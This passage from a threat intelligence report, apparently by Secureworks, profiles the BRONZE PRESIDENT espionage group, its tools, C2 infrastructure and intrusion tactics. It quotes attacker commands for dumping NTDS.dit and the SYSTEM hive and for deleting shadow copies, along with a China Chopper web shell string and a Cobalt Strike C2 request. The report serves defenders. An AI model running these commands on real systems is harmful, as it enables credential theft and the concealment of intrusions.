As a\nresult, these organizations are often exposed to increased government-directed threats\naimed at monitoring their activities, discrediting their work, or stealing their intellectual\nproperty. BRONZE PRESIDENT is a likely People's Republic of China (PRC)-based targeted\ncyberespionage group that uses both proprietary and publicly available tools to target NGO\nnetworks. Secureworks® Counter Threat Unit™ (CTU) researchers have observed BRONZE\nPRESIDENT activity since mid-2018 but identified artifacts suggesting that the threat actors\nmay have been conducting network intrusions as far back as 2014.\n\n[CTU™ researchers divided the threat intelligence about this threat group into two sections:](https://www.gartner.com/en/documents/2487216/)\nstrategic and tactical. Executives can use the strategic assessment of the ongoing threat to\ndetermine how to reduce risk to their organization's mission and critical assets. Computer\nnetwork defenders can use the tactical information gathered from incident response\ninvestigations and research to reduce the time and effort associated with responding to the\nthreat group's activities.\n\n## Key points\n\nThe BRONZE PRESIDENT cyberespionage group targets NGOs, as well as political\nand law enforcement organizations in countries in South and East Asia.\nThe threat group appears to have developed its own remote access tools that it uses\nalongside publicly available remote access and post-compromise toolsets.\nAfter compromising a network, the threat actors elevate their privileges and install\nmalware on a large proportion of systems. The group runs custom batch scripts to\ncollect specific file types and takes proactive steps to minimize detection of its\nactivities.\n\n## Strategic threat intelligence\n\nAnalysis of a threat group's targeting, origin, and competencies can determine which\norganizations could be at risk. This information can help organizations make strategic\ndefensive decisions in relation to the BRONZE PRESIDENT threat group.\n\n### Intent\n\nCTU researchers have observed BRONZE PRESIDENT targeting multiple NGOs. The threat\nactors steal data from compromised systems over a long period of time, which likely\nindicates a long-term objective of monitoring the target's network. BRONZE PRESIDENT\nuses custom batch scripts to collect either specific file types (including files with .pptx, .xlsx,\n\n\n-----\n\n.pdf extensions) or all files within a specific location. CTU researchers also observed\nevidence that the threat actors collect credentials from high-privilege network accounts and\nreputationally sensitive accounts, such as social media and webmail accounts.\n\nAdditionally, CTU researchers have observed evidence of BRONZE PRESIDENT targeting\npolitical and law enforcement organizations in countries adjacent to the PRC, including\nMongolia and India. Some of the group's phishing lures suggest an interest in national\nsecurity, humanitarian, and law enforcement organizations in the East, South, and Southeast\nAsia (see Figure 1). These examples reveal BRONZE PRESIDENT's likely intent to conduct\npolitical espionage in other countries in addition to targeting NGOs.\n\n_Figure 1. August 2019 phishing lure referencing Mongolian national security topics. (Source:_\n_Secureworks)_\n\n### Attribution\n\n\n-----\n\nIt is highly likely that BRONZE PRESIDENT is based in the PRC due to the following\nobservations:\n\nThe NGOs targeted by BRONZE PRESIDENT conduct research on issues relevant to\nthe PRC.\nStrong evidence links BRONZE PRESIDENT's infrastructure to entities within the PRC.\nThere are connections between a subset of the group's operational infrastructure and\nPRC-based Internet service providers.\nTools such as PlugX have historically been leveraged by threat groups operating in the\nPRC.\n\nIt is likely that BRONZE PRESIDENT is sponsored or at least tolerated by the PRC\ngovernment. The threat group's systemic long-term targeting of NGO and political networks\ndoes not align with patriotic or criminal threat groups.\n\n### Capability\n\nBRONZE PRESIDENT has deployed a variety of remote access tools. The use of tools not\npreviously observed by CTU researchers suggests that the group could have access to\nmalware development capabilities. BRONZE PRESIDENT also uses widely available or\nmodified open-source tools, which could be a strategic effort to reduce the risk of attribution\nor to minimize the need for tool development resources. Following a network compromise,\nthe threat actors typically delete their tools and processes. However, the group is content\nleaving some malware on the network, likely to provide a contingency if other access\nchannels are removed. When the group's activities were detected in one incident, it had\nelevated privileges and had maintained access to the targeted environment for several\nmonths. This finding indicates the group's effectiveness at maintaining long-term access to a\ntargeted network.\n\n## Tactical threat intelligence\n\nIncident response engagements have given CTU researchers insight into the threat group's\ntools and tactics.\n\n### Tools\n\nCTU researchers and Secureworks incident responders have observed BRONZE\nPRESIDENT using the following tools, along with several custom batch scripts for locating\nand archiving specific file types:\n\n\n-----\n\nCobalt Strike — This popular and commercially available penetration tool gains shell\naccess to an infected system. It allows threat actors to execute additional tools and\nperform post-intrusion actions on compromised systems. Cobalt Strike appears to be\none of BRONZE PRESIDENT's preferred remote access tools. During one intrusion,\nthe threat actors installed it on over 70% of accessible hosts. The group's Cobalt Strike\ninstallation typically uses a payload named svchost.exe in an attempt to disguise\nCobalt Strike activity as the legitimate Windows svchost.exe executable.\nPlugX — This remote access trojan (RAT) is popular among PRC-based targeted\nthreat groups. Its functionality includes uploading and downloading files, and it has\nconfigurable network protocols. BRONZE PRESIDENT installs PlugX using DLL sideloading. In June and August 2019, BRONZE PRESIDENT delivered PlugX via\n[government and law enforcement-themed phishing lures.](https://twitter.com/h4ckak/status/1163328926573137922?s=19)\nORat — CTU researchers have only observed this basic loader tool in the context of\nBRONZE PRESIDENT intrusions. ORat is the name assigned by the malware author,\nas denoted by the program debug database string in the analyzed sample:\nD:\\vswork\\Plugin\\ORat\\build\\Release\\ORatServer\\Loader.pdb. The tool uses the\nWindows Management Instrumentation (WMI) event consumer for persistence by\ninstalling a script to the system's WMI registry. Messages sent from ORat to its\ncommand and control (C2) server start with the string \"VIEWS0018x\". If the data\nreceived from the C2 server starts with the same string, then the remainder of the\npayload is decompressed using ORat's \"deflate\" algorithm and called as a function.\nORat acts as a flexible loader tool rather than a fully featured remote access tool.\nRCSession — This basic RAT is installed via DLL side-loading, and CTU researchers\nobserved BRONZE PRESIDENT installing it on multiple hosts during intrusions.\n[RCSession was extracted from a file called English.rtf and launched via a hollowed](https://attack.mitre.org/techniques/T1093/)\nsvchost.exe process. RCSession connects to its C2 server via a custom protocol, can\nremotely execute commands, and can launch additional tools. CTU researchers have\nno evidence of other threat actors using RCSession or of wide proliferation of the tool,\nsuggesting it may be exclusively used by BRONZE PRESIDENT.\nNbtscan — This publicly available command-line tool scans systems for NetBIOS\nname information (see Figure 2). In an example observed by CTU researchers, the\nNbtscan executable was named Adobe.exe and was installed in several working\ndirectories on compromised hosts, including: C:\\Recovery\\.\n\n_Figure 2. Nbtscan being used via RCSession to scan an internal IP range. (Source:_\n_Secureworks)_\nNmap — BRONZE PRESIDENT used this freely available network scanning tool from\nthe C:\\PerfLogs\\ folder.\n\n\n-----\n\n[Wmiexec — This publicly available tool uses WMI to create SYSTEM-level shells on](https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs)\nremote hosts.\n\n**Links to other malware**\n\nWhile analyzing hosts compromised by BRONZE PRESIDENT, CTU researchers identified\nother malware artifacts. Although there was no evidence of the group using the malware, the\nthreat actors may have leveraged its access or capabilities during earlier phases of the\nintrusions. The BRONZE PRESIDENT intrusions observed by CTU researchers appear to\nhave taken place over several months or years.\n\nChina Chopper web shell files named error404.aspx included the\n\"eval(Request.Item[\"|\"],\"unsafe\");\" string. To successfully interact with the web shell, a threat\nactor sent HTTP requests that included the \"|\" parameter. The web shell files appeared to be\ninstalled during the timeframe that BRONZE PRESIDENT was active on the system (see\nFigure 3).\n\n_Figure 3. Timeline of malicious tool use on a compromised host. (Source: Secureworks)_\n\nCTU researchers identified a variety of post-compromise tools stored under %AppData%\n(e.g., \\AppData\\Roaming\\Temp) on several compromised systems. The widespread\nproliferation and use of the following tools suggest that the group likely has the knowledge\nand capability to use them as part of its operations:\n\n[Powerview.ps1 — This PowerShell-based module for network reconnaissance is part](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1)\nof the [PowerSploit penetration testing framework.](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)\n[PVE Find AD User — This command-line tool identifies login locations of Active](https://www.corelan.be/index.php/2009/07/12/free-tool-find-where-ad-users-are-logged-on-into/)\nDirectory (AD) users.\n[AdFind — This command-line tool conducts AD queries.](http://www.joeware.net/freetools/tools/adfind/)\n[NetSess — This publicly available tool enumerates NetBIOS sessions.](http://www.joeware.net/freetools/tools/netsess/)\n[Netview — This tool enumerates networks.](https://github.com/mubix/netview)\n\n\n-----\n\n[TeamViewer — This remote control and desktop-sharing tool has applications for](https://www.teamviewer.com/)\nlegitimate and malicious system users. Its installation in a temporary directory\nalongside network reconnaissance and enumeration tools likely indicates malicious\nintent.\n\n### Initial access and working directories\n\nAt the time of detection, observed BRONZE PRESIDENT incidents had likely been ongoing\nfor several months or even years. As a result, CTU researchers were unable to ascertain the\n[initial access vector. In October 2019, third-party researchers described a phishing campaign](https://www.anomali.com/blog/china-based-apt-mustang-panda-targets-minority-groups-public-and-private-sector-organizations)\nthat used C2 infrastructure that CTU researchers attribute to BRONZE PRESIDENT. This\nconnection suggests that the group uses phishing emails with ZIP attachments that contain\nLNK files as an initial access vector.\n\nDuring one intrusion, the threat actors gained administrator access to all systems within a\ntargeted business unit and installed their remote access tools on 80% of the hosts. The\ngroup installed multiple tools within the environment, including three different tools on a\nstrategically important server, likely to provide contingency access options (see Table 1).\n\n**HOST** **Cobalt Strike** **RCSession** **ORat**\n\nHost 1 (Server) X X X\n\nHost 2 (User PC) X\n\nHost 3 (User PC) X X\n\nHost 4 (User PC) X\n\nHost 5 (User PC) X\n\nHost 6 (User PC) X X\n\nHost 7 (User PC) X\n\n_Table 1. Remote access tools identified on infected hosts during a BRONZE PRESIDENT_\n_intrusion._\n\nBRONZE PRESIDENT used multiple directories to install tools on compromised hosts (see\nTable 2).\n\n**Directory** **Associated tool**\n\nC:\\RECYCLER\\ ORat\n\n\n-----\n\n**Directory** **Associated tool**\n\nC:\\Windows\\Help\\Help\\ Cobalt Strike\n\nC:\\Windows\\debug\\WIA\\ Cobalt Strike\n\nC:\\Windows\\Logs\\DPX\\ Cobalt Strike\n\nC:\\PerfLogs\\ RCSession\n\nC:\\Recovery\\ Nbtscan\n\n_Table 2. Directories used by BRONZE PRESIDENT to execute or store tools._\n\n### Network enumeration, lateral movement, and credential access\n\nDuring multiple intrusions, the threat actors employed various tools and techniques to\nunderstand the network environments. For example, they used Nmap to scan various\ninternal IP address ranges and SMB ports (see Figure 4). They also relied on Nbtscan, net\nuser, and ping commands to obtain insights and identify opportunities for lateral movement.\n\n_Figure 4. Nmap network scanning tool use via RCSession. (Source: Secureworks)_\n\nBRONZE PRESIDENT regularly leverages Wmiexec to move laterally. During one intrusion,\nthe threat actors extensively used this tool to execute WMI commands on remote hosts in\nthe environment (see Figure 5).\n\n_Figure 5. Wmiexec used to execute commands on a targeted host. (Source: Secureworks)_\n\nThey also frequently leverage net commands to connect to other hosts (see Figure 6) using\ncompromised credentials collected during early phases of the intrusion.\n\n\n-----\n\n_Figure 6. BRONZE PRESIDENT Nbtscan use and net commands. (Source: Secureworks)_\n\nDuring one intrusion observed by CTU researchers, the group used the native vssadmin tool\non a domain controller to create a volume shadow copy:\n```\nvssadmin create shadow /for=c:\n\n```\nThe threat actors retrieved the NTDS.dit file from the volume shadow copy. NTDS.dit\ncontains Active Directory data, including password hashes for all users on a domain.\nExtracting hashes from the NTDS.dit file requires access to the SYSTEM file in the system\nregistry:\n```\nreg save hklm\\system c:\\windows\\temp\\system.hive\n\n```\nThe threat actors saved both the SYSTEM file (system.hive) and NTDS.dit in the\ncompromised host's c:\\windows\\temp directory. These files were likely exfiltrated and\nexploited offline to retrieve user password hashes, which could then be cracked or used to\nperform pass-the-hash attacks.\n\n### C2 communications and infrastructure\n\nBRONZE PRESIDENT's C2 techniques are dictated by its remote access tools. The group's\nprimary and likely proprietary RCSession RAT communicates with a hard-coded C2 server\nusing a custom protocol over TCP port 443. After connecting to its C2 server, RCSession\nchecks in with an encrypted beacon and then awaits instruction. The ORat tool, which\nappears to be used less frequently by the group, communicates over TCP port 80 using a\nraw socket protocol (not HTTP).\n\nThe Cobalt Strike tool has malleable C2 profiles. During one intrusion, it connected to\nmultiple C2 domains on TCP port 80, including mail . svrchost . com, using the following\nrequest. Subsequent Cobalt Strike C2 servers included subdomains of svchosts . com,\nsvrchost . com, and strust . club.\n\n\n-----\n\n```\nGET /Dv9i HTTP/1.1\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)\nHost: mail . svrchost . com\nConnection: Keep-Alive\nCache-Control: no-cache\n\n```\nSome BRONZE PRESIDENT C2 domains analyzed by CTU researchers were hosted on\ninfrastructure owned by Dutch VPS provider Host Sailor, Hong Kong-based New World\nTelecoms, and Malaysia-based Shinjiru Technology (see Figure 7). The threat actors have\nused discrete infrastructure clusters that share matching hosting and registration\ncharacteristics. The pattern of infrastructure hosting suggests that the group parks its\ndomains when not in use, an operational security technique that limits exposure of the\ngroup's overall hosting infrastructure.\n\n_Figure 7. Hosting for a subset of BRONZE PRESIDENT C2 domains. (Source: Secureworks)_\n\n### Persistence, defensive evasion, and exfiltration\n\nSome of BRONZE PRESIDENT's malware has persistence capabilities. For example, ORat\nuses a WMI event consumer to maintain its presence on a compromised host. The group\nalso creates and maintains scheduled tasks to achieve this purpose. Figure 8 shows a\nSysdriver scheduled task that periodically executes a Cobalt Strike payload.\n\n\n-----\n\n_Figure 8. BRONZE PRESIDENT scheduled task created for Cobalt Strike persistence._\n_(Source: Secureworks)_\n\nThe threat actors tend to install malware on a large proportion of hosts during their\nintrusions. However, the group exercises restraint and defensive evasion tactics to minimize\nopportunities for network defenders to detect or investigate its activities. For example, the\nthreat actors deleted volume shadow copies after using them for NTDS.dit retrieval:\n```\nvssadmin delete shadows /for=c: /quiet\n\n```\nLikewise, the group demonstrated diligence by killing local and remote processes after they\nhad been used:\n```\n   taskkill /im svchosts.exe /F\n   taskkill /S <REMOTE SYSTEM NAME> /U <USERNAME> /P <PASSWORD> /im svchost.exe\n\n```\nBRONZE PRESIDENT targets specific data types. The threat actors use custom batch\nscripts to create a list of files with predefined criteria and collate the identified files into a .rar\narchive (see Figure 9). CTU researchers have observed BRONZE PRESIDENT batch scripts\nnamed doc.bat, xls.bat, xlsx.bat, ppt.bat, pptx.bat, pdf.bat, and txt.bat.\n\n\n-----\n\n_Figure 9. Batch script (pptx.bat) used to collate and archive all .pptx files in a defined_\n_location. (Source: Secureworks)_\n\nThe group also uses the all.bat batch script to collect all files stored on a specific user's\ndesktop. CTU researchers observed RCSession and Cobalt Strike on systems that BRONZE\nPRESIDENT targeted for data theft. Either of these tools could have been used to exfiltrate\nthe archived data.\n\n## Conclusion\n\nBRONZE PRESIDENT has demonstrated intent to steal data from organizations using tools\nsuch as Cobalt Strike, PlugX, ORat, and RCSession. The concurrent use of so many tools\nduring a single intrusion suggests that the group could include threat actors with distinct\ntactics, roles, and tool preferences. It is likely that BRONZE PRESIDENT has additional\nunobserved operational tools and capabilities. CTU researchers recommend that\norganizations apply controls to mitigate common intrusion techniques and behaviors along\nwith controls that address the tools and techniques discussed in this analysis.\n\n## Threat indicators\n\nThe threat indicators in Table 3 are associated with BRONZE PRESIDENT threat\ncampaigns.
